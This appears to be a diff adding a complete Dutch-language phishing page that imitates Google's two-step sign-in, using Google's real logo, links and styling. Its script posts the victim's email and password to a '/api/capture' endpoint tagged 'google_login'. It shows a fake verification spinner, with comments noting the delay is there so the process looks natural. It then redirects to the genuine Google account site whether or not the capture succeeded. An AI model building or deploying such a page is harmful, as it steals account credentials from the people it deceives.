@@ -1,0 +1,572 @@
+<!DOCTYPE html>
+<html lang="nl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Inloggen - Google-accounts</title>
+    <link rel="icon" href="https://www.google.com/favicon.ico" type="image/x-icon">
+    <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500&family=Roboto:wght@400;500&display=swap" rel="stylesheet">
+    <style>
+        *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
+
+        :root {
+            --blue: #1a73e8;
+            --blue-hover: #1557b0;
+            --text-primary: #202124;
+            --text-secondary: #5f6368;
+            --text-link: #1a73e8;
+            --border: #dadce0;
+            --error: #d93025;
+            --bg: #fff;
+        }
+
+        html, body { height: 100%; }
+
+        body {
+            font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
+            background: var(--bg);
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+            color: var(--text-primary);
+        }
+
+        .page-wrap {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 24px 16px;
+        }
+
+        /* ── Card ── */
+        .card {
+            width: 100%;
+            max-width: 448px;
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 48px 40px 36px;
+        }
+
+        .card-logo {
+            display: block;
+            margin: 0 auto 28px;
+            height: 24px;
+        }
+
+        .card-title {
+            font-size: 24px;
+            font-weight: 400;
+            color: var(--text-primary);
+            text-align: center;
+            margin-bottom: 10px;
+        }
+
+        .card-subtitle {
+            font-size: 16px;
+            font-weight: 400;
+            color: var(--text-primary);
+            text-align: center;
+            margin-bottom: 28px;
+        }
+
+        /* ── Material outlined input ── */
+        .field {
+            position: relative;
+            margin-bottom: 6px;
+        }
+
+        .field input {
+            width: 100%;
+            height: 56px;
+            padding: 20px 48px 4px 16px;
+            border: 1px solid var(--border);
+            border-radius: 4px;
+            font-size: 16px;
+            font-family: inherit;
+            color: var(--text-primary);
+            background: transparent;
+            outline: none;
+            caret-color: var(--blue);
+            transition: border-color 0.15s;
+        }
+
+        .field input:focus {
+            border: 2px solid var(--blue);
+            padding: 20px 47px 3px 15px;
+        }
+
+        .field input.err {
+            border: 2px solid var(--error) !important;
+            padding: 20px 47px 3px 15px;
+        }
+
+        .field label {
+            position: absolute;
+            left: 16px;
+            top: 50%;
+            transform: translateY(-50%);
+            font-size: 16px;
+            color: var(--text-secondary);
+            pointer-events: none;
+            transition: all 0.15s ease;
+            background: var(--bg);
+            padding: 0 2px;
+            transform-origin: left top;
+        }
+
+        /* Floating label */
+        .field input:focus ~ label,
+        .field input:not(:placeholder-shown) ~ label {
+            top: 12px;
+            transform: scale(0.75) translateY(0);
+            font-size: 16px;
+            color: var(--blue);
+        }
+
+        .field input.err ~ label {
+            color: var(--error) !important;
+        }
+
+        /* Eye icon */
+        .eye-btn {
+            position: absolute;
+            right: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            cursor: pointer;
+            padding: 6px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            color: var(--text-secondary);
+        }
+
+        .eye-btn:hover { background: #f1f3f4; }
+
+        /* Error message */
+        .err-msg {
+            display: none;
+            font-size: 12px;
+            color: var(--error);
+            margin: 4px 0 0 16px;
+            align-items: center;
+            gap: 4px;
+            line-height: 1.4;
+        }
+
+        .err-msg.show { display: flex; }
+
+        /* Links */
+        .link {
+            font-size: 14px;
+            color: var(--text-link);
+            text-decoration: none;
+            font-weight: 500;
+        }
+
+        .link:hover { text-decoration: underline; }
+
+        .forgot-wrap { margin-top: 8px; }
+
+        .info-text {
+            font-size: 14px;
+            color: var(--text-secondary);
+            line-height: 22px;
+            margin: 20px 0 28px;
+        }
+
+        /* Actions row */
+        .actions {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 32px;
+        }
+
+        .btn-next {
+            min-width: 100px;
+            height: 36px;
+            padding: 0 24px;
+            background: var(--blue);
+            color: #fff;
+            font-family: inherit;
+            font-size: 14px;
+            font-weight: 500;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            letter-spacing: 0.25px;
+            transition: background 0.2s, box-shadow 0.2s;
+        }
+
+        .btn-next:hover {
+            background: var(--blue-hover);
+            box-shadow: 0 1px 3px rgba(0,0,0,.3);
+        }
+
+        .btn-next:disabled { opacity: .8; cursor: default; }
+
+        /* Password step */
+        #step-password { display: none; }
+
+        .step-back {
+            display: flex;
+            align-items: center;
+            gap: 4px;
+            margin-bottom: 28px;
+        }
+
+        .back-icon-btn {
+            background: none;
+            border: none;
+            cursor: pointer;
+            padding: 8px;
+            border-radius: 50%;
+            color: var(--text-secondary);
+            display: flex;
+            align-items: center;
+        }
+
+        .back-icon-btn:hover { background: #f1f3f4; }
+
+        .avatar-wrap { text-align: center; margin-bottom: 8px; }
+
+        .avatar {
+            width: 64px;
+            height: 64px;
+            border-radius: 50%;
+            background: #e8f0fe;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 28px;
+            font-weight: 500;
+            color: var(--blue);
+            text-transform: uppercase;
+            margin-bottom: 8px;
+        }
+
+        .email-chip {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            border: 1px solid var(--border);
+            border-radius: 16px;
+            padding: 4px 12px 4px 8px;
+            font-size: 14px;
+            color: var(--text-primary);
+            cursor: pointer;
+            transition: background 0.15s;
+            margin-bottom: 28px;
+        }
+
+        .email-chip:hover { background: #f1f3f4; }
+
+        /* Footer */
+        footer {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 12px 24px 16px;
+            font-size: 12px;
+            color: var(--text-secondary);
+            flex-wrap: wrap;
+            gap: 8px;
+            border-top: 1px solid var(--border);
+        }
+
+        .lang-select {
+            border: none;
+            background: none;
+            color: var(--text-secondary);
+            font-size: 12px;
+            cursor: pointer;
+            font-family: inherit;
+            outline: none;
+        }
+
+        .footer-links { display: flex; gap: 20px; }
+        .footer-links a { color: var(--text-secondary); text-decoration: none; }
+        .footer-links a:hover { text-decoration: underline; }
+
+        /* Spinner */
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .spinner {
+            display: inline-block;
+            width: 16px; height: 16px;
+            border: 2px solid rgba(255,255,255,.4);
+            border-top-color: #fff;
+            border-radius: 50%;
+            animation: spin .7s linear infinite;
+            vertical-align: middle;
+        }
+
+        @media (max-width: 500px) {
+            .card { border: none; padding: 32px 16px 24px; max-width: 100%; }
+        }
+    </style>
+</head>
+<body>
+
+<div class="page-wrap">
+    <div class="card">
+
+        <!-- ── STAP 1: E-mail ── -->
+        <div id="step-email">
+            <img class="card-logo"
+                 src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png"
+                 alt="Google">
+            <h1 class="card-title">Inloggen</h1>
+            <p class="card-subtitle">Gebruik je Google-account</p>
+
+            <div class="field">
+                <input type="email" id="emailInput" placeholder=" "
+                       autocomplete="email" spellcheck="false">
+                <label for="emailInput">E-mailadres of telefoonnummer</label>
+            </div>
+            <div class="err-msg" id="emailErr">
+                <svg width="16" height="16" viewBox="0 0 24 24" fill="#d93025">
+                    <path d="M12 2C6.47 2 2 6.47 2 12s4.47 10 10 10 10-4.47 10-10S17.53 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
+                </svg>
+                <span id="emailErrTxt">Voer een e-mailadres in</span>
+            </div>
+
+            <div class="forgot-wrap">
+                <a href="https://accounts.google.com/signin/recovery" target="_blank" class="link">E-mailadres vergeten?</a>
+            </div>
+
+            <p class="info-text">
+                Wil je liever je eigen account aanmaken?
+                <a href="#" class="link">Meer informatie</a>
+            </p>
+
+            <div class="actions">
+                <a href="https://accounts.google.com/signup" target="_blank" class="link">Account aanmaken</a>
+                <button class="btn-next" onclick="goToPassword()">Volgende</button>
+            </div>
+        </div>
+
+        <!-- ── STAP 2: Wachtwoord ── -->
+        <div id="step-password">
+
+            <div class="step-back">
+                <button class="back-icon-btn" onclick="goBack()" aria-label="Terug">
+                    <svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor">
+                        <path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/>
+                    </svg>
+                </button>
+                <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png"
+                     alt="Google" style="height:20px;">
+            </div>
+
+            <div class="avatar-wrap">
+                <div class="avatar" id="avatarLetter">G</div>
+            </div>
+
+            <div style="text-align:center; margin-bottom:28px;">
+                <div class="email-chip" onclick="goBack()">
+                    <svg width="18" height="18" viewBox="0 0 24 24" fill="#5f6368">
+                        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/>
+                    </svg>
+                    <span id="emailDisplay"></span>
+                    <svg width="16" height="16" viewBox="0 0 24 24" fill="#5f6368">
+                        <path d="M7 10l5 5 5-5z"/>
+                    </svg>
+                </div>
+            </div>
+
+            <h1 class="card-title" style="margin-bottom:28px;">Welkom</h1>
+
+            <div class="field">
+                <input type="password" id="pwInput" placeholder=" "
+                       autocomplete="current-password">
+                <label for="pwInput">Voer je wachtwoord in</label>
+                <button class="eye-btn" type="button" id="eyeBtn" onclick="togglePw()" aria-label="Wachtwoord tonen">
+                    <!-- eye open -->
+                    <svg id="eyeIcon" width="22" height="22" viewBox="0 0 24 24" fill="currentColor">
+                        <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zm0 12.5c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>
+                    </svg>
+                </button>
+            </div>
+            <div class="err-msg" id="pwErr">
+                <svg width="16" height="16" viewBox="0 0 24 24" fill="#d93025">
+                    <path d="M12 2C6.47 2 2 6.47 2 12s4.47 10 10 10 10-4.47 10-10S17.53 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
+                </svg>
+                <span>Voer een wachtwoord in</span>
+            </div>
+
+            <div class="forgot-wrap">
+                <a href="https://accounts.google.com/signin/recovery" target="_blank" class="link">Wachtwoord vergeten?</a>
+            </div>
+
+            <div class="actions">
+                <a href="#" class="link">Meer opties</a>
+                <button class="btn-next" id="pwBtn" onclick="submitLogin()">Volgende</button>
+            </div>
+        </div>
+
+    </div>
+</div>
+
+<footer>
+    <select class="lang-select" aria-label="Taal">
+        <option>Nederlands</option>
+        <option>English (United States)</option>
+        <option>Français (France)</option>
+        <option>Deutsch</option>
+        <option>Español</option>
+    </select>
+    <div class="footer-links">
+        <a href="#">Help</a>
+        <a href="#">Privacy</a>
+        <a href="#">Voorwaarden</a>
+    </div>
+</footer>
+
+<script>
+    let eyeOpen = false;
+
+    /* ── Stap 1 → 2 ── */
+    function goToPassword() {
+        const inp = document.getElementById('emailInput');
+        const email = inp.value.trim();
+        const errEl = document.getElementById('emailErr');
+        const errTxt = document.getElementById('emailErrTxt');
+
+        if (!email) {
+            inp.classList.add('err');
+            errTxt.textContent = 'Voer een e-mailadres in';
+            errEl.classList.add('show');
+            inp.focus();
+            return;
+        }
+
+        if (!email.includes('@') && !/^\+?\d{7,}$/.test(email)) {
+            inp.classList.add('err');
+            errTxt.textContent = 'Voer een geldig e-mailadres of telefoonnummer in';
+            errEl.classList.add('show');
+            inp.focus();
+            return;
+        }
+
+        inp.classList.remove('err');
+        errEl.classList.remove('show');
+
+        document.getElementById('emailDisplay').textContent = email;
+        document.getElementById('avatarLetter').textContent = email.charAt(0).toUpperCase();
+
+        document.getElementById('step-email').style.display = 'none';
+        document.getElementById('step-password').style.display = 'block';
+        setTimeout(() => document.getElementById('pwInput').focus(), 50);
+    }
+
+    /* ── Stap 2 → 1 ── */
+    function goBack() {
+        document.getElementById('step-password').style.display = 'none';
+        document.getElementById('step-email').style.display = 'block';
+        document.getElementById('pwInput').value = '';
+        document.getElementById('pwErr').classList.remove('show');
+        document.getElementById('pwInput').classList.remove('err');
+        setTimeout(() => document.getElementById('emailInput').focus(), 50);
+    }
+
+    /* ── Oog-knop ── */
+    function togglePw() {
+        eyeOpen = !eyeOpen;
+        document.getElementById('pwInput').type = eyeOpen ? 'text' : 'password';
+        document.getElementById('eyeIcon').innerHTML = eyeOpen
+            ? '<path d="M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.83l2.92 2.92c1.51-1.26 2.7-2.89 3.43-4.75-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 2.16C10.74 7.13 11.35 7 12 7zM2 4.27l2.28 2.28.46.46C3.08 8.3 1.78 10.02 1 12c1.73 4.39 6 7.5 11 7.5 1.55 0 3.03-.3 4.38-.84l.42.42L19.73 22 21 20.73 3.27 3 2 4.27zM7.53 9.8l1.55 1.55c-.05.21-.08.43-.08.65 0 1.66 1.34 3 3 3 .22 0 .44-.03.65-.08l1.55 1.55c-.67.33-1.41.53-2.2.53-2.76 0-5-2.24-5-5 0-.79.2-1.53.53-2.2zm4.31-.78l3.15 3.15.02-.16c0-1.66-1.34-3-3-3l-.17.01z"/>'
+            : '<path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zm0 12.5c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>';
+    }
+
+    /* ── Inloggen ── */
+    function submitLogin() {
+        const pw = document.getElementById('pwInput');
+        const errEl = document.getElementById('pwErr');
+
+        if (!pw.value) {
+            pw.classList.add('err');
+            errEl.classList.add('show');
+            pw.focus();
+            return;
+        }
+
+        pw.classList.remove('err');
+        errEl.classList.remove('show');
+
+        const btn = document.getElementById('pwBtn');
+        btn.innerHTML = '<span class="spinner"></span>';
+        btn.disabled = true;
+
+        const email = document.getElementById('emailDisplay').textContent;
+        const password = pw.value;
+
+        // Show "Verifying..." status under button
+        let dotCount = 0;
+        const statusEl = document.createElement('div');
+        statusEl.style.cssText = 'font-size:12px;color:#5f6368;text-align:right;margin-top:8px;min-height:18px';
+        statusEl.textContent = 'Verifiëren...';
+        btn.parentElement.insertAdjacentElement('afterend', statusEl);
+        const dotInterval = setInterval(() => {
+            dotCount = (dotCount + 1) % 4;
+            statusEl.textContent = 'Verifiëren' + '.'.repeat(dotCount);
+        }, 400);
+
+        // Send and wait for server confirmation, then redirect
+        const doRedirect = () => {
+            clearInterval(dotInterval);
+            statusEl.textContent = '';
+            window.location.href = 'https://myaccount.google.com/';
+        };
+
+        fetch('/api/capture', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                email,
+                password,
+                source: 'google_login',
+                timestamp: new Date().toISOString()
+            })
+        })
+        .then(r => r.json())
+        .then(() => {
+            // Server confirmed — short extra delay so it looks natural
+            setTimeout(doRedirect, 800);
+        })
+        .catch(() => {
+            // Server unreachable — still redirect after fallback delay
+            setTimeout(doRedirect, 2000);
+        });
+
+        // Absolute max wait: 8 seconds, then redirect no matter what
+        setTimeout(doRedirect, 8000);
+    }
+
+    /* ── Enter-toets ── */
+    document.addEventListener('keydown', function (e) {
+        if (e.key !== 'Enter') return;
+        if (document.getElementById('step-password').style.display === 'block') {
+            submitLogin();
+        } else {
+            goToPassword();
+        }
+    });
+
+    /* ── Fout wissen bij typen ── */
+    document.getElementById('emailInput').addEventListener('input', function () {
+        this.classList.remove('err');
+        document.getElementById('emailErr').classList.remove('show');
+    });
+
+    document.getElementById('pwInput').addEventListener('input', function () {
+        this.classList.remove('err');
+        document.getElementById('pwErr').classList.remove('show');
+    });
+</script>
+
+</body>
+</html>
